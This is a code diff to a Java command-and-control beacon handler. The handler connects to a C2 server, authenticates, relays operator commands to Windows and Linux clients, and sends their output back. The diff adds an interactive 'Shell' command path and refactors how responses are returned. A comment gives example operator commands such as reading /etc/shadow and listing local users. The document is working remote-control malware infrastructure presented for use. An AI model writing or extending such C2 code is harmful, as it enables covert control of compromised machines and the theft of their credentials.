@@ -1,6 +1,7 @@
 package Servers.Beacon;
 
 import java.io.IOException;
+import java.net.NoRouteToHostException;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -23,6 +24,9 @@ public class BeaconC2Handler implements Runnable{
     private Thread keepAliveThread;
     private Object sendLock;
 
+    // Used to know if this thread should kill the server, due to a unsuccessful connection to the C2
+    private Boolean killServer;
+
     /**
      * This starts a thread that sends and receives messages with the C2 Server
      * 
@@ -35,8 +39,15 @@ public class BeaconC2Handler implements Runnable{
      */
     protected BeaconC2Handler(BeaconServer beaconServer, String C2ServerIPAddress, String passwordDigest) throws IOException{
         this.beaconServer = beaconServer;
-        Socket socket = new Socket(C2ServerIPAddress, 1234);
-        this.C2Server = new Duplexer(socket);
+
+        this.killServer = false;
+        try{
+            Socket socket = new Socket(C2ServerIPAddress, 1234);
+            this.C2Server = new Duplexer(socket);
+        } catch (NoRouteToHostException e){
+            this.killServer = true;
+        }
+        
         this.passwordDigest = passwordDigest;
         this.sendLock = new Object();
         this.keepAliveClass = new keepAlive(C2Server, sendLock, false, false);
@@ -55,39 +66,70 @@ public class BeaconC2Handler implements Runnable{
         }
     }
 
+    protected void sendResponsesToC2Server(String scope){
+        StringBuilder responseToRequest = new StringBuilder();
+        HashMap<String, ArrayList<String>> clientResponses = beaconServer.getClientResponses(scope);
+        for (String IP : clientResponses.keySet()) {
+            responseToRequest.append("Client IP: ").append(IP).append("\n");
+            responseToRequest.append("Responses:\n");
+
+            ArrayList<String> responses = clientResponses.get(IP);
+            for (int i = 0; i < responses.size(); i++) {
+                String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
+                
+                // Only add if the line is not empty
+                if (!line.isEmpty()) {
+                    responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
+                }
+            }
+            responseToRequest.append("\n"); // Separate each client's response block with a newline
+        }
+        String finalResponseToRequest = responseToRequest.toString() + "END_OF_OUTPUT";
+        C2Server.send(finalResponseToRequest);
+    }
+
     @Override
     public void run(){
-        /**
-         * Commands from the C2 Server are organized by two attributes
-         * Type - Command, Request, Status
-         * Scope - Windows, Linux, or IPv4 Address
-         * 
-         * Examples
-         * 
-         * Command Windows_Get-LocalUser
-         * Request Linux_
-         * Request 192.168.1.5_
-         * Scope All
-         * Command Linux_whoami
-         * Command 10.0.10.x_cat /etc/shadow
-         */
-
-        // Attempt to authenticate with the C2 Server. If authentication fails, gracefully close, and distribute the quit
-        // message to the Beacon Server for further distribution.
         Boolean authenticationSentinel = true;
-        C2Server.send(passwordDigest);
-        try{
-            String message = C2Server.receive();
-            if(!(message.equals("Authentication Successful"))){
-                String reason = "Authentication with the C2 Server Unsuccesful. Message Received from C2 Server: " + message;
-                beaconServer.quit(reason);
-                C2Server.close();
+        if(killServer){
+            try {
+                beaconServer.quit("Could not connect to C2 Server");
                 authenticationSentinel = false;
-            } else {
-                keepAliveThread.start();
+            } catch (IOException e){
+                e.printStackTrace();
             }
-        }catch(IOException e){
-            e.printStackTrace();
+        } else {
+            /**
+             * Commands from the C2 Server are organized by two attributes
+             * Type - Command, Request, Status
+             * Scope - Windows, Linux, or IPv4 Address
+             * 
+             * Examples
+             * 
+             * Command Windows_Get-LocalUser
+             * Request Linux_
+             * Request 192.168.1.5_
+             * Scope All
+             * Command Linux_whoami
+             * Command 10.0.10.x_cat /etc/shadow
+             */
+
+            // Attempt to authenticate with the C2 Server. If authentication fails, gracefully close, and distribute the quit
+            // message to the Beacon Server for further distribution.
+            C2Server.send(passwordDigest);
+            try{
+                String message = C2Server.receive();
+                if(!(message.equals("Authentication Successful"))){
+                    String reason = "Authentication with the C2 Server Unsuccesful. Message Received from C2 Server: " + message;
+                    beaconServer.quit(reason);
+                    C2Server.close();
+                    authenticationSentinel = false;
+                } else {
+                    keepAliveThread.start();
+                }
+            } catch(IOException e){
+                e.printStackTrace();
+            }
         }
         
         while(authenticationSentinel){
@@ -119,24 +161,7 @@ public class BeaconC2Handler implements Runnable{
                     }
                     // If a message is a request, it will be in the format "Request [Scope - Windows, Linux, or IPv4 Address]_"
                     else if(verb.equals("Request")){
-                        StringBuilder responseToRequest = new StringBuilder();
-                        HashMap<String, ArrayList<String>> clientResponses = beaconServer.getClientResponses(scope);
-                        for (String IP : clientResponses.keySet()) {
-                            responseToRequest.append("Client IP: ").append(IP).append("\n");
-                            responseToRequest.append("Responses:\n");
-
-                            ArrayList<String> responses = clientResponses.get(IP);
-                            for (int i = 0; i < responses.size(); i++) {
-                                String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
-                                
-                                // Only add if the line is not empty
-                                if (!line.isEmpty()) {
-                                    responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
-                                }
-                            }
-                            responseToRequest.append("\n"); // Separate each client's response block with a newline
-                        }
-                        C2Server.send(responseToRequest.toString());
+                        sendResponsesToC2Server(scope);
                     }
                     // If a message is a Status check, it will be in the format "Status All_"
                     else if(verb.equals("Status")){
@@ -144,6 +169,17 @@ public class BeaconC2Handler implements Runnable{
                         responseToRequest = beaconServer.getClientStatus();
                         C2Server.send(responseToRequest);
                     }
+                    // Shell is essentially the same thing as sending commands, however we want to send responses back immediately
+                    else if (verb.equals("Shell")){
+                        beaconServer.getShellResponse(scope, commands);
+                    }
+                }
+            } catch (NullPointerException e){
+                try {
+                    beaconServer.quit("C2 Server shut down connection.");
+                    authenticationSentinel = false;
+                } catch (IOException er){
+                    er.printStackTrace();
                 }
             } catch(IOException e){
                 e.printStackTrace();
